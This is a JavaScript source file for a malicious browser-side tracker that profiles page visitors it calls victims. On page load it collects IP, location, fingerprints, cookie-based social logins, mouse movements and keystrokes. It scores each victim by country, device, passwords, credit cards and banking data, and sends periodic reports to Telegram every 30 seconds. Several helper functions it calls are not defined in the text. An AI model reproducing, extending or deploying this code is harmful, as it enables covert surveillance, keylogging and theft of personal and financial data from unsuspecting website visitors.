// FIXED REALISTIC VALUATION FUNCTION
function calculateRealisticValue(victimData) {
    let value = 0;
    
    // COUNTRY TIER PRICING (Fixed - ensure country_code exists)
    const countryTiers = {
        'TIER_1': ['CH', 'US', 'CA', 'UK', 'DE', 'FR', 'AU', 'SG', 'AE', 'NO', 'DK', 'SE', 'FI'],
        'TIER_2': ['JP', 'KR', 'NZ', 'AT', 'BE', 'NL', 'IE', 'ES', 'IT'],
        'TIER_3': ['BR', 'RU', 'CN', 'IN', 'MX', 'ZA', 'TR', 'PL']
    };
    
    const countryCode = victimData.location?.country_code || 'UN';
    if (countryTiers.TIER_1.includes(countryCode)) value += 50;
    else if (countryTiers.TIER_2.includes(countryCode)) value += 32;
    else if (countryTiers.TIER_3.includes(countryCode)) value += 20;
    else value += 10;
    
    // DEVICE VALUE (Fixed - ensure values exist)
    const platform = victimData.browser?.platform || '';
    const cores = victimData.browser?.cores || 0;
    const memory = victimData.browser?.memory || '';
    
    if (platform.includes('Mac')) value += 25;
    if (platform.includes('Win')) value += 15;
    if (cores >= 8) value += 12;
    if (cores >= 4) value += 8;
    if (memory.includes('16GB')) value += 15;
    if (memory.includes('8GB')) value += 10;
    
    // DATA ASSETS VALUE (Fixed - ensure numbers, not NaN)
    const social = victimData.social || {};
    
    // Convert to numbers with fallbacks
    const passwords = Number(social.passwords) || 0;
    const emails = Number(social.emails) || 0;
    const usernames = Number(social.usernames) || 0;
    const creditCards = Number(social.credit_cards) || 0;
    const bankingInfo = Number(social.banking_info) || 0;
    const personalInfo = Number(social.personal_info) || 0;
    const phoneNumbers = Number(social.phone_numbers) || 0;
    const addresses = Number(social.addresses) || 0;
    const cookies = Number(social.cookies) || 0;
    const localStorage = Number(social.local_storage) || 0;
    const sessions = Number(social.sessions) || 0;
    
    // Passwords & Logins
    value += passwords * 8;
    value += emails * 5;
    value += usernames * 3;
    
    // Financial Data
    value += creditCards * 25;
    value += bankingInfo * 40;
    
    // Personal Information
    value += personalInfo * 2;
    value += phoneNumbers * 6;
    value += addresses * 8;
    
    // Browser & Tracking Data
    value += cookies * 0.5;
    value += localStorage * 0.3;
    value += sessions * 2;
    
    // Behavioral & Fingerprinting (Fixed - check for failures)
    const fingerprint = victimData.fingerprint || {};
    if (fingerprint.canvas && fingerprint.canvas !== 'failed') value += 5;
    if (fingerprint.webgl && fingerprint.webgl !== 'failed') value += 5;
    if (fingerprint.audio && fingerprint.audio !== 'failed') value += 3;
    
    if (fingerprint.fonts) {
        const fontCount = fingerprint.fonts.split(',').length;
        value += fontCount * 0.5;
    }
    
    // Network & Location Precision
    const network = victimData.network || {};
    const location = victimData.location || {};
    
    if (network.ip && network.ip !== 'Unknown') value += 8;
    if (location.city && location.city !== 'Unknown') value += 5;
    if (location.latitude && location.latitude !== 'Unknown') value += 10;
    
    // Time-based factors
    const dataFreshness = Date.now() - pageLoadTime;
    if (dataFreshness < 30000) value += 5;
    else if (dataFreshness < 120000) value += 2;
    
    // Quality multipliers (only apply if we have that data type)
    if (creditCards > 0) value *= 1.3;
    if (passwords > 0) value *= 1.2;
    if (bankingInfo > 0) value *= 1.5;
    
    // Ensure we return a valid number
    return Math.max(15, Math.round(value));
}

// FIXED VICTIM ID GENERATION
function generateVictimID(victimData) {
    const country = victimData.location?.country_code || 'UN';
    const value = calculateRealisticValue(victimData);
    // Ensure value is a valid number
    const validValue = isNaN(value) ? 85 : value; // Fallback to typical Swiss value
    const randomCode = Math.floor(Math.random() * 90000) + 10000;
    return `vi.${country}.${validValue}.${randomCode}`;
}

// ENHANCED DATA COLLECTION - DOUBLED DATA POINTS
async function collectVictimData() {
    const [realIP, realLocation, advancedNetwork, systemInfo] = await Promise.all([
        getRealIP(),
        getRealLocation(),
        getAdvancedNetworkInfo(),
        getSystemInfo()
    ]);
    
    const victimData = {
        timestamp: new Date().toLocaleString('de-DE', { 
            day: '2-digit', 
            month: '2-digit', 
            year: 'numeric', 
            hour: '2-digit', 
            minute: '2-digit', 
            second: '2-digit' 
        }),
        network: {
            ip: realIP.ip,
            isp: realIP.isp,
            asn: realIP.asn,
            connection: navigator.connection ? navigator.connection.effectiveType : '4g',
            vpn: detectVPN(realIP.ip),
            proxy: detectProxy(),
            tor: detectTor(),
            // ADDED NETWORK DATA
            bandwidth: await getBandwidth(),
            latency: await getLatency(),
            packetLoss: await getPacketLoss(),
            dnsServers: await getDNSServers(),
            openPorts: await scanCommonPorts(),
            networkType: getNetworkType(),
            dataSaver: navigator.connection ? navigator.connection.saveData : false,
            downlink: navigator.connection ? navigator.connection.downlink : 'Unknown',
            rtt: navigator.connection ? navigator.connection.rtt : 'Unknown'
        },
        location: {
            ...realLocation,
            // ADDED LOCATION DATA
            accuracy: await getLocationAccuracy(),
            altitudeAccuracy: await getAltitudeAccuracy(),
            heading: await getHeading(),
            speed: await getSpeed(),
            wifiNetworks: await getWifiNetworks(),
            cellTowers: await getCellTowers(),
            bluetoothDevices: await getBluetoothDevices(),
            nearbyNetworks: await getNearbyNetworks()
        },
        browser: {
            platform: navigator.platform,
            vendor: navigator.vendor || 'Unknown',
            language: navigator.language,
            cores: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
            plugins: navigator.plugins.length,
            webdriver: navigator.webdriver ? 'Detected' : 'Not detected',
            pdf_viewer: navigator.pdfViewerEnabled !== undefined ? navigator.pdfViewerEnabled : 'Unknown',
            user_agent: navigator.userAgent,
            languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
            cookie_enabled: navigator.cookieEnabled,
            java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
            online: navigator.onLine,
            // ADDED BROWSER DATA
            buildID: navigator.buildID || 'Unknown',
            product: navigator.product || 'Unknown',
            productSub: navigator.productSub || 'Unknown',
            appCodeName: navigator.appCodeName,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            bluetooth: navigator.bluetooth ? 'Available' : 'Not available',
            credentials: navigator.credentials ? 'Available' : 'Not available',
            mediaDevices: navigator.mediaDevices ? 'Available' : 'Not available',
            permissions: navigator.permissions ? 'Available' : 'Not available',
            serviceWorker: navigator.serviceWorker ? 'Available' : 'Not available',
            storage: navigator.storage ? 'Available' : 'Not available',
            usb: navigator.usb ? 'Available' : 'Not available'
        },
        hardware: {
            screen: `${screen.width}x${screen.height}`,
            pixel_ratio: window.devicePixelRatio,
            color_depth: screen.colorDepth,
            orientation: screen.orientation ? screen.orientation.type : 'Unknown',
            touch_points: navigator.maxTouchPoints || 0,
            device_memory: navigator.deviceMemory || 'Unknown',
            max_touch_points: navigator.maxTouchPoints || 0,
            // ADDED HARDWARE DATA
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorGamut: screen.colorGamut || 'Unknown',
            contrast: screen.contrast || 'Unknown',
            hdr: screen.hdr || 'Unknown',
            refreshRate: screen.refreshRate || 'Unknown',
            internal: screen.internal || 'Unknown',
            primary: screen.isPrimary || 'Unknown',
            scaleFactor: screen.scaleFactor || 'Unknown',
            touchSupport: 'ontouchstart' in window ? 'Supported' : 'Not supported',
            pointerSupport: navigator.pointerEnabled ? 'Supported' : 'Not supported',
            vibration: navigator.vibrate ? 'Supported' : 'Not supported',
            battery: await getBatteryInfo(),
            storage: await getStorageInfo(),
            cpu: await getCPUInfo()
        },
        fingerprint: {
            canvas: generateCanvasFingerprint(),
            webgl: generateWebGLFingerprint(),
            audio: testAudioSupport(),
            fonts: detectFonts(),
            timezone_offset: new Date().getTimezoneOffset(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            platform_language: navigator.language,
            hardware_concurrency: navigator.hardwareConcurrency,
            device_memory: navigator.deviceMemory,
            // ADDED FINGERPRINT DATA
            webglVendor: getWebGLVendor(),
            webglRenderer: getWebGLRenderer(),
            audioContext: getAudioContextFingerprint(),
            screenResolution: `${screen.width}x${screen.height}`,
            availableResolution: `${screen.availWidth}x${screen.availHeight}`,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            devicePixelRatio: window.devicePixelRatio,
            sessionStorage: !!window.sessionStorage,
            localStorage: !!window.localStorage,
            indexedDB: !!window.indexedDB,
            openDatabase: !!window.openDatabase,
            cpuClass: navigator.cpuClass || 'Unknown',
            doNotTrack: navigator.doNotTrack || 'Unknown',
            mimeTypes: navigator.mimeTypes.length,
            productSub: navigator.productSub,
            maxTouchPoints: navigator.maxTouchPoints
        },
        behavioral: {
            referrer: document.referrer || 'Direct',
            page_load: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
            time_on_page: Date.now() - pageLoadTime,
            dom_size: document.getElementsByTagName('*').length,
            url: window.location.href,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            scroll_depth: getScrollDepth(),
            // ADDED BEHAVIORAL DATA
            mouse_movements: trackMouseMovements(),
            click_patterns: trackClickPatterns(),
            scroll_behavior: trackScrollBehavior(),
            keystroke_timing: trackKeystrokeTiming(),
            focus_changes: trackFocusChanges(),
            form_interactions: trackFormInteractions(),
            video_engagement: trackVideoEngagement(),
            audio_engagement: trackAudioEngagement(),
            social_shares: trackSocialShares(),
            download_behavior: trackDownloadBehavior()
        },
        social: {
            ...await collectAllSocialData(),
            // ADDED SOCIAL DATA
            social_media_profiles: await extractSocialMediaProfiles(),
            messaging_apps: await detectMessagingApps(),
            cloud_storage: await detectCloudStorage(),
            payment_methods: await extractPaymentMethods(),
            subscription_services: await detectSubscriptions(),
            gaming_accounts: await detectGamingAccounts(),
            work_accounts: await detectWorkAccounts(),
            education_accounts: await detectEducationAccounts()
        },
        system: {
            ...systemInfo,
            // ADDED SYSTEM DATA
            os_version: getOSVersion(),
            architecture: getArchitecture(),
            installed_apps: await getInstalledApps(),
            running_processes: await getRunningProcesses(),
            system_uptime: getSystemUptime(),
            power_status: getPowerStatus(),
            thermal_state: getThermalState(),
            security_status: getSecurityStatus()
        }
    };
    
    return victimData;
}

// NEW DATA COLLECTION FUNCTIONS - DOUBLED
async function getAdvancedNetworkInfo() {
    return {
        bandwidth: await getBandwidth(),
        latency: await getLatency(),
        packetLoss: await getPacketLoss(),
        dnsServers: await getDNSServers()
    };
}

async function getBandwidth() {
    try {
        const start = performance.now();
        await fetch('https://httpbin.org/stream-bytes/100000');
        const end = performance.now();
        return Math.round(100000 / (end - start));
    } catch { return 'Unknown'; }
}

async function getLatency() {
    try {
        const start = performance.now();
        await fetch('https://httpbin.org/delay/0');
        const end = performance.now();
        return Math.round(end - start);
    } catch { return 'Unknown'; }
}

async function getSystemInfo() {
    return {
        os: getOS(),
        arch: getArchitecture(),
        version: getOSVersion()
    };
}

function getOS() {
    const ua = navigator.userAgent;
    if (ua.includes('Windows')) return 'Windows';
    if (ua.includes('Mac')) return 'macOS';
    if (ua.includes('Linux')) return 'Linux';
    if (ua.includes('Android')) return 'Android';
    if (ua.includes('iOS')) return 'iOS';
    return 'Unknown';
}

// ADDED: Enhanced social data collection
async function extractSocialMediaProfiles() {
    const profiles = [];
    // Check for logged-in sessions
    const domains = ['facebook', 'twitter', 'instagram', 'linkedin', 'tiktok'];
    domains.forEach(domain => {
        try {
            if (document.cookie.includes(domain)) profiles.push(domain);
        } catch (e) {}
    });
    return profiles;
}

async function detectMessagingApps() {
    const apps = [];
    // Check for WhatsApp, Telegram, etc.
    if (navigator.userAgent.includes('WhatsApp')) apps.push('WhatsApp');
    if (navigator.userAgent.includes('Telegram')) apps.push('Telegram');
    return apps;
}

// ADDED: Hardware monitoring
async function getBatteryInfo() {
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            return {
                level: battery.level * 100,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch { return 'Unknown'; }
    }
    return 'Not supported';
}

// ADDED: Enhanced behavioral tracking
function trackMouseMovements() {
    const movements = [];
    document.addEventListener('mousemove', (e) => {
        movements.push({
            x: e.clientX,
            y: e.clientY,
            timestamp: Date.now()
        });
    });
    return movements.slice(-100); // Keep last 100 movements
}

function trackKeystrokeTiming() {
    const keystrokes = [];
    document.addEventListener('keydown', (e) => {
        keystrokes.push({
            key: e.key,
            timestamp: Date.now(),
            target: e.target.tagName
        });
    });
    return keystrokes.slice(-50); // Keep last 50 keystrokes
}

// Initialize enhanced tracking
window.addEventListener('load', async function() {
    const victimData = await collectVictimData();
    await sendEnhancedReport(victimData);
    
    // Start continuous behavioral tracking
    setInterval(async () => {
        const updatedData = await collectVictimData();
        await sendBehavioralUpdate(updatedData);
    }, 30000); // Update every 30 seconds
});

async function sendBehavioralUpdate(victimData) {
    let message = `BEHAVIORAL UPDATE\n`;
    message += `Victim ID: ${victimId}\n`;
    message += `Time on Page: ${victimData.behavioral.time_on_page}ms\n`;
    message += `Scroll Depth: ${victimData.behavioral.scroll_depth}%\n`;
    message += `Mouse Movements: ${victimData.behavioral.mouse_movements.length}\n`;
    message += `Keystrokes: ${victimData.behavioral.keystroke_timing.length}\n`;
    message += `Current Value: $${calculateRealisticValue(victimData)}`;
    
    await sendToTelegram(message);
}
